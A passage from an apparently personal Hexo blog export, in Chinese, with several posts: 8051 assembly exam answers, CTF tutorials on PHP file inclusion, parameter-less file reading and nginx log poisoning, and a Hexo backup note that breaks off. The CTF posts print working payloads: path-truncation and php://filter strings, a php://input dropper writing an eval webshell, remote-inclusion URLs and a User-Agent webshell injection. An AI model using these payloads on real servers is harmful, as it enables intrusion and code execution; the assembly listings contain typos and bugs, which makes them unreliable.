    <title>单片机期末程序题</title>
    <url>/2021/06/22/%E5%8D%95%E7%89%87%E6%9C%BA%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/</url>
    <content><![CDATA[<p>单片机期末考试的五道程序题<a id="more"></a></p>
<p>1、晶振为12Mhz，编写延迟时间为1ms的延迟子程序</p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">DELAY:</span> <span class="keyword">MOV</span> <span class="built_in">R5</span>,<span class="meta">#10H</span></span><br><span class="line"><span class="symbol">LOOP1:</span> <span class="keyword">MOV</span> <span class="built_in">R6</span>,<span class="meta">#250H</span></span><br><span class="line"><span class="symbol">LOOP2:</span> DJMZ <span class="built_in">R6</span>,LOOP2</span><br><span class="line">	   DJMZ <span class="built_in">R5</span>,LOOP1</span><br><span class="line">	   <span class="keyword">RETI</span></span><br><span class="line">END</span><br></pre></td></tr></table></figure>


<p>2.查询地址30H-60H中，出现AAH的次数</p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line">ORG <span class="number">0000</span>H</span><br><span class="line">AJMP MAIN</span><br><span class="line">ORG <span class="number">0100</span>H</span><br><span class="line"><span class="symbol">MAIN:</span><span class="keyword">MOV</span> <span class="built_in">R1</span>,<span class="meta">#60H</span></span><br><span class="line">	 <span class="keyword">MOV</span> <span class="built_in">R0</span>,<span class="meta">#0</span></span><br><span class="line"><span class="symbol">START:</span><span class="keyword">DEC</span> <span class="built_in">R1</span></span><br><span class="line">      CJNE <span class="built_in">R1</span>,<span class="meta">#02FH,NEXT</span></span><br><span class="line">      AJMP EXT</span><br><span class="line"><span class="symbol">NEXT:</span>CJNE @<span class="built_in">R1</span>,<span class="meta">#0AAH,START</span></span><br><span class="line">     <span class="keyword">INC</span> <span class="built_in">R0</span></span><br><span class="line">     AJMP START</span><br><span class="line"><span class="symbol">EXT:</span>END</span><br></pre></td></tr></table></figure>


<p>3.设计令定时器T0在P2.0上产生频率为20Hz方波</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ORG</span> <span class="number">0000</span>H</span><br><span class="line"><span class="attribute">AJMP</span> MAIN</span><br><span class="line"><span class="attribute">ORG</span> <span class="number">000</span>BH</span><br><span class="line"><span class="attribute">AJMP</span> CTMO</span><br><span class="line"><span class="attribute">ORG</span> <span class="number">0030</span>H</span><br><span class="line"><span class="attribute">MAIN</span>:MOV TMOD,#<span class="number">01</span>H</span><br><span class="line">     <span class="attribute">MOV</span> TH<span class="number">0</span>,#<span class="number">9</span>EH</span><br><span class="line">     <span class="attribute">MOV</span> TL<span class="number">0</span>,#<span class="number">58</span>H</span><br><span class="line">     <span class="attribute">SETB</span> EA</span><br><span class="line">     <span class="attribute">SETB</span> ET<span class="number">0</span></span><br><span class="line">     <span class="attribute">SETB</span> TR<span class="number">0</span></span><br><span class="line"><span class="attribute">WAIT</span>:SJMP WAIT</span><br><span class="line"><span class="attribute">CTMO</span>:MOV TH<span class="number">0</span>,#<span class="number">9</span>EH</span><br><span class="line">     <span class="attribute">MOV</span> TL<span class="number">0</span>,<span class="number">58</span>H</span><br><span class="line">     <span class="attribute">CPL</span> P<span class="number">2</span>.<span class="number">0</span></span><br><span class="line">     <span class="attribute">EXIT</span></span><br><span class="line"><span class="attribute">END</span></span><br></pre></td></tr></table></figure>


<p>4.串行口通信</p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line">ORG OOOOH</span><br><span class="line">AJMP MAIN</span><br><span class="line">ORG <span class="number">0100</span>H</span><br><span class="line"><span class="symbol">MAIN:</span><span class="keyword">MOV</span> SP,<span class="meta">#60H</span></span><br><span class="line">     <span class="keyword">MOV</span> <span class="built_in">R0</span>,<span class="meta">#0</span></span><br><span class="line">     <span class="keyword">MOV</span> SCON,<span class="meta">#40H</span></span><br><span class="line"><span class="symbol">START:</span> LCALL DELAY</span><br><span class="line">       <span class="keyword">INC</span> <span class="built_in">R0</span></span><br><span class="line">       <span class="keyword">MOV</span> A,<span class="built_in">R0</span></span><br><span class="line">       <span class="keyword">MOV</span> SBUF,A</span><br><span class="line">       JNB T1,$</span><br><span class="line">       <span class="keyword">CLR</span> T1</span><br><span class="line">       LJMP SATRT</span><br><span class="line">       END</span><br><span class="line"><span class="symbol">DELAY:</span><span class="keyword">MOV</span> <span class="built_in">R5</span>,<span class="meta">#10</span></span><br><span class="line"><span class="symbol">LOOP1:</span><span class="keyword">MOV</span> <span class="built_in">R6</span>,<span class="meta">#200</span></span><br><span class="line"><span class="symbol">LOOP2:</span><span class="keyword">MOV</span> <span class="built_in">R7</span>,<span class="meta">#250</span></span><br><span class="line">	  DJMZ <span class="built_in">R7</span>,$</span><br><span class="line">	  DJMZ <span class="built_in">R6</span>,LOOP2</span><br><span class="line">	  DJMZ <span class="built_in">R5</span>,LOOP1</span><br><span class="line">	  <span class="keyword">RET</span></span><br></pre></td></tr></table></figure>


<p>5.按键显示</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ORG</span> <span class="number">0000</span>H</span><br><span class="line"><span class="attribute">AJMP</span> MAIN</span><br><span class="line"><span class="attribute">ORG</span> <span class="number">0100</span>H</span><br><span class="line"><span class="attribute">MAIN</span>:MOV P<span class="number">1</span>,#<span class="number">0</span></span><br><span class="line"><span class="attribute">NET1</span>:JB P<span class="number">0</span>.<span class="number">0</span>,NET<span class="number">2</span></span><br><span class="line">	 <span class="attribute">MOV</span> P<span class="number">1</span>,#<span class="number">09</span>FH</span><br><span class="line"><span class="attribute">MET2</span>:JB P<span class="number">0</span>.<span class="number">1</span>,NET<span class="number">3</span></span><br><span class="line">     <span class="attribute">MOV</span> P<span class="number">1</span>,#<span class="number">0</span>A<span class="number">4</span>H</span><br><span class="line"><span class="attribute">NET3</span>:JB P<span class="number">0</span>.<span class="number">2</span>,NET<span class="number">4</span></span><br><span class="line">	 <span class="attribute">MOV</span> P<span class="number">1</span>,#<span class="number">0</span>B<span class="number">0</span>H</span><br><span class="line"><span class="attribute">NET4</span>:JB P<span class="number">0</span>.<span class="number">3</span>,NET<span class="number">0</span></span><br><span class="line">     <span class="attribute">MOV</span> P<span class="number">1</span>,#<span class="number">99</span>H</span><br><span class="line">     <span class="attribute">LMP</span> NET<span class="number">1</span></span><br><span class="line"><span class="attribute">END</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>单片机</category>
      </categories>
  </entry>
  <entry>
    <title>常考文件包含漏洞</title>
    <url>/2020/04/09/%E5%B8%B8%E8%80%83%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>   程序开发人员在写程序的过程中，不喜欢把同样的代码写上好几次，因此通常会把需要重复使用的的代码写到单个的文件里，当需要使<a id="more"></a>用的时候就直接调用这个文件，不需要去重新编写，这种调用的过程就被称为包含。我们需要调用某个文件的时候，就会通过PHP的函数引用文件，如果这个时候传入的文件名没有经过合理校验，从而操作了预想之外的文件，就会导致意外的文件泄露甚至恶意的代码注入</p>
<hr>
<p><img src="https://img.npfs06.top/20210305094721.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h1 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h1><p>   在PHP文件包含漏洞的函数最常见的有以下四个：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">require</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">require_once</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">include</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">include_once</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>
<p>当使用这些函数包含一个新的文件时，只要文件的内容符合PHP的语法规范，则任何拓展名的文件都可以被当作PHP解析，例如上传一个包含恶意代码的txt./ jpg.文件，都会被当作PHP文件执行。</p>
<h1 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h1><h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><ul>
<li>直接读取目标机上的Flag文件</li>
</ul>
<h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><ul>
<li>指定第三方服务器上可运行的PHP木马，得到webshell,查看flag文件</li>
</ul>
<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><h2 id="查看php的全局配置文件php-ini"><a href="#查看php的全局配置文件php-ini" class="headerlink" title="查看php的全局配置文件php.ini"></a>查看php的全局配置文件php.ini</h2><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">allow_url_fopen</span> = <span class="literal">on</span>/<span class="literal">off</span></span><br><span class="line"><span class="attr">allow_url_include</span> = <span class="literal">on</span>/<span class="literal">off</span></span><br></pre></td></tr></table></figure>
<p>只有以上两个都开启的时候才会存在远程文件包含 </p>
<h2 id="本地文件包含-1"><a href="#本地文件包含-1" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><ul>
<li>直接包含flag文件</li>
<li>通过PHP伪协议读取代码中的flag</li>
<li>传入PHP木马获取webshell,得到flag</li>
</ul>
<h3 id="直接包含flag文件"><a href="#直接包含flag文件" class="headerlink" title="直接包含flag文件"></a>直接包含flag文件</h3><h4 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h4><p>  结束符：\x00–&gt; %00</p>
<h4 id="路径长度截断"><a href="#路径长度截断" class="headerlink" title="路径长度截断"></a>路径长度截断</h4><p>  Windows下目录最大长度为256字节，超出的部分会被丢弃；<br>  Linux下目录最大长度为4096字节，超出的部分会被丢弃。<br>  例：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>www.ctfs-wiki.com<span class="regexp">/FI/</span>FI.php?filename=test.txt<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span><span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>./.</span><br></pre></td></tr></table></figure>
<h4 id="点号截断"><a href="#点号截断" class="headerlink" title="点号截断"></a>点号截断</h4><blockquote>
<p>windows OS，点号需要长于256 </p>
</blockquote>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>www.ctfs-wiki.com<span class="regexp">/FI/</span>FI.php?filename=test.txtspan><br></pre></td></tr></table></figure>
<h3 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h3><ul>
<li>file://  –访问本地文件系统</li>
<li>php://   –访问各个输入输出流</li>
</ul>
<h4 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h4><p>用法： file://[文件的绝对路径和文件名]</p>
<p>条件（php.ini)  :  allow_url_fopen = off/on<br>​                              allow_url_include = off/on</p>
<h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h4><p>用法：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">?filename=php:<span class="regexp">//</span>filter<span class="regexp">/convert.base64-encode/</span>resource=xxx.php</span><br></pre></td></tr></table></figure>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">php://<span class="built_in">filter</span>/<span class="keyword">read</span>=<span class="built_in">string</span>.<span class="built_in">toupper</span>|<span class="built_in">string</span>.rot13/resource=xxx.php</span><br></pre></td></tr></table></figure>
<p>php://filter伪协议可以套一层协议，就像：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">php:<span class="regexp">//</span>filter<span class="regexp">/read=convert.base64-encode/</span>woofers/resource=index</span><br></pre></td></tr></table></figure>
<p>条件（php.ini)  : allow_url_fopen = off/on<br>​                             allow_url_include = off/on</p>
<h3 id="传入PHP木马获取webshell-得到flag"><a href="#传入PHP木马获取webshell-得到flag" class="headerlink" title="传入PHP木马获取webshell,得到flag"></a>传入PHP木马获取webshell,得到flag</h3><p><strong>php://input</strong></p>
<p>用法：?file=php://input 数据利用POST传过去</p>
<p>条件（php.ini)  :  allow_url_fopen = off/on<br>​                              allow_url_include = on</p>
<p>木马文件（shell.php)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?PHP</span> fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>菜刀/蚁剑连接</p>
<h2 id="远程文件包含-1"><a href="#远程文件包含-1" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><h4 id="问号绕过"><a href="#问号绕过" class="headerlink" title="问号绕过"></a>问号绕过</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>www.ctfs-wiki.com<span class="regexp">/FI/</span>WFI.php?filename=http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">91.133</span><span class="regexp">/FI/</span>php.txt?</span><br></pre></td></tr></table></figure>
<h4 id="号绕过"><a href="#号绕过" class="headerlink" title="#号绕过"></a>#号绕过</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>www.ctfs-wiki.com<span class="regexp">/FI/</span>WFI.php?filename=http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">91.133</span><span class="regexp">/FI/</span>php.txt%<span class="number">23</span></span><br></pre></td></tr></table></figure>
<h4 id="20绕过"><a href="#20绕过" class="headerlink" title="%20绕过"></a>%20绕过</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>www.ctfs-wiki.com<span class="regexp">/FI/</span>WFI.php?filename=http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">91.133</span><span class="regexp">/FI/</span>php.txt%<span class="number">20</span></span><br></pre></td></tr></table></figure>
<p>可参考<a href="https://segmentfault.com/a/1190000018991087">https://segmentfault.com/a/1190000018991087</a></p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title>无参数文件读取</title>
    <url>/2020/10/07/%E6%97%A0%E5%8F%82%E6%95%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/</url>
    <content><![CDATA[<p>无参数的意思可以是a()、a(b())或a(b(c()))，但不能是a(‘b’)或a(‘b’,’c’)，<strong>不能带参数</strong><a id="more"></a></p>
<h2 id="print-r-scandir-‘-’"><a href="#print-r-scandir-‘-’" class="headerlink" title="print_r(scandir(‘.’))"></a>print_r(scandir(‘.’))</h2><p>可以用来查看当前目录所有文件名</p>
<p>但是我们这里说的是要构造无参数的函数，所以我们要做的就是去掉这个点号</p>
<ul>
<li><p>localeconv()  函数返回一包含本地数字及货币格式信息的数组。</p>
</li>
<li><p>current()        函数返回数组中的当前元素（单元）,默认取第一个值，</p>
</li>
<li><p>pos() 同 current()  ,是current()的别名</p>
</li>
<li><p>reset()   函数返回数组第一个单元的值，如果数组为空则返回 FALSE</p>
</li>
<li><p><code>chr(46)</code>就是字符<code>&quot;.&quot;</code></p>
</li>
<li><p>正常的，我们还可以用<code>print_r(scandir(&#39;绝对路径&#39;));</code>来查看当前目录文件名</p>
<p>获取绝对路径可用的有<code>getcwd()</code>和<code>realpath(&#39;.&#39;)</code></p>
</li>
</ul>
<p>​        所以我们还可以用<code>print_r(scandir(getcwd()));</code>输出当前文件夹所有文件名</p>
<p>**localeconv() ** 函数 返回数组的第一项就是 .  (小数点)，如下图</p>
<p><img src="https://img.npfs06.top/20210405212936.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>我们可以通过读取该小数点代替print_r(scandir(‘.’))中的小数点 ，读取数组第一项可以的函数有current()、pos() 、reset()</p>
<p>所以最终我们可以构造如下：</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">print_r</span>(<span class="title">scandir</span>(<span class="title">current</span>(<span class="title">localeconv</span>())));</span></span><br><span class="line"><span class="function"><span class="title">print_r</span>(<span class="title">scandir</span>(<span class="title">pos</span>(<span class="title">localeconv</span>())));</span></span><br><span class="line"><span class="function"><span class="title">print_r</span>(<span class="title">scandir</span>(<span class="title">reset</span>(<span class="title">localeconv</span>())));</span></span><br></pre></td></tr></table></figure>




<p><code>array_reverse()</code> 以相反的元素顺序返回数组</p>
<p><code>end()</code>将数组内部指针指向最后一个单元</p>
<p><code>next()</code>将数组的内部指针向前移动一位,指向下一个元素</p>
<p><code>prev</code>将数组的内部指针倒回一位</p>
<p><code>array_rand()</code>是随机返回一个数组</p>
<p><code>array_rand(array_flip())</code>，<code>array_flip()</code>是交换数组的键和值</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title>日志文件包含</title>
    <url>/2020/07/04/%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<p>测试靶机：CTFshow WEB4</p>
<a id="more"></a>

<h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p>1.输入<?php phpinfo();?>进行测试</p>
<p>2.查看相应日志文件，在本题中文件日志默认地址为<code>/var/log/nginx/access.log</code><br> （可通过抓包查看得知服务器为Ubuntu，由nginx搭建的网站，nginx的日志文件默认地址在/var/log/nginx/access.log和/var/log/nginx/error.log，其中本题中access.log可以打开）</p>
<p> <img src="http://img.npfs06.top/20210226200525.jpeg?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="http://img.npfs06.top/20210226200537.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><code>?url=/var/log/nginx/access.log</code>,查看文件日志，发现刚刚get的phpinfo存在日志里,且被转义</p>
<p><img src="http://img.npfs06.top/20210226200550.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>3.重新Get <?php phpinfo();?> 并进行抓包</p>
<p><img src="http://img.npfs06.top/20210226200609.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>将这里的<code>%3C?php%20phpinfo();?%3E</code>改成<code>&lt;?php phpinfo();?&gt;</code><br>修改之后放包，再去文件包含日志文件，发现<?php phpinfo();?>已被执行</p>
<p>4.由此判断存在日志注入漏洞</p>
<h2 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h2><p>1.输入一句话木马<code>&lt;?php @eval($_POST[npfs]);?&gt;</code></p>
<p><img src="http://img.npfs06.top/20210226200625.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>2.抓包将转义后的<code>&lt;?php @eval($_POST[npfs]);?&gt;</code>修改回来，放包（实际做法，如上面所述）</p>
<p>3.访问日志文件，查看存在一句话木马内容，说明一句话木马被当作php语言正常解析</p>
<p>4.蚁剑连接</p>
<p><img src="http://img.npfs06.top/20210226200638.jpeg?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>flag在根目录下的www的flag.txt文件中</p>
<h2 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h2><p>1.url :<code>?url=/var/log/nginx/access.log</code>,抓包</p>
<p>2.利用 user-agent 插入 payload 到日志文件</p>
<p><img src="http://img.npfs06.top/20210226200655.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<ol start="3">
<li>放包，蚁剑连接<br> <img src="http://img.npfs06.top/20210226200708.jpeg?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></li>
</ol>
<p>flag在根目录下的www的flag.txt文件中</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title>本地源文件备份推送到Github 报错及解决</title>
    <url>/2021/02/24/%E6%9C%AC%E5%9C%B0%E6%BA%90%E6%96%87%E4%BB%B6%E5%A4%87%E4%BB%BD%E6%8E%A8%E9%80%81%E5%88%B0Github-%E6%8A%A5%E9%94%99%E5%8F%8A%E8%A7%A3%E5%86%B3/</url>
    <content><![CDATA[<p>在我企图在<code>github</code>的xxx.github.io仓库新建分支对基于hexo搭建的blog通过hexo-git-backup插件进<a id="more"></a>行备份时出现了以下的问题</p>
<h2 id="问题出现"><a href="#问题出现" class="headerlink" title="问题出现"></a>问题出现</h2><p>根据网上教程，我查看了本地hexo版本</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">hexo <span class="built_in">version</span></span><br></pre></td></tr></table></figure>
<p><img src="http://img.npfs06.top/20210224110039.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>因此我使用了这条命令：</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">npm <span class="keyword">install </span>hexo-git-<span class="keyword">backup </span>--save</span><br></pre></td></tr></table></figure>
<p>进行博客备份插件安装</p>
<p>同时我在github仓库建立新分支，我创建的分支名为backup</p>
<p>然后我在本地博客根目录的配置文件<code>_config.yml</code>最下方加入以下内容</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="meta"># backup</span></span><br><span class="line"><span class="symbol">backup:</span></span><br><span class="line"><span class="symbol">  type:</span> git</span><br><span class="line"><span class="symbol">  theme:</span> next-reloaded</span><br><span class="line"><span class="symbol">  message:</span> Back up my www.npfs06.top blog</span><br><span class="line"><span class="symbol">  repository:</span></span><br><span class="line"><span class="symbol">    github:</span> https:<span class="comment">//github.com/xxxx/xxxx.github.io.git,backup</span></span><br></pre></td></tr></table></figure>
<blockquote>
